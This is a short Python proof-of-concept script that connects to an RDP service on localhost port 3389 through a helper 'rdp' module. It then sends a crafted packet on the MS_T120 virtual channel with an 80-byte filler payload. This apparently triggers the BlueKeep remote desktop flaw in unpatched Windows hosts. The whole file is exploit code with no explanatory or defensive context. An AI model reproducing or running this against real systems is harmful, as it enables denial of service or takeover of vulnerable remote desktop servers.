import rdp
import socket


def main():

    host = '127.0.0.1'
    port = 3389

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    crypter = rdp.connect(s)

    s.sendall(rdp.write_mst120_custom(crypter, 7, 1007, b'A'*80))

    input('lul')

    s.close()


if __name__== "__main__":
    main()

